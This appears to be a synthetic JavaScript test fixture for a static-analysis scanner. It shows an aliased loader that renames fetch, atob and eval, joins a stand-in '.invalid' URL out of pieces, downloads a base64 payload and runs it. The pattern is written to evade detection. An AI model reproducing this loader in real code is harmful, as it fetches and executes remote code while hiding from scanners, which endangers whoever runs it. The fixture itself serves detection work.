// Synthetic aliasing fixture for an expected static-analysis evasion; never execute.
export async function syntheticAliasedLoader() {
  const pull = fetch;
  const decode = atob;
  const run = eval;
  const endpoint = ["https://loader-delta.invalid/", "payload.txt"].join("");
  const response = await pull(endpoint);
  return run(decode(await response.text()));
}
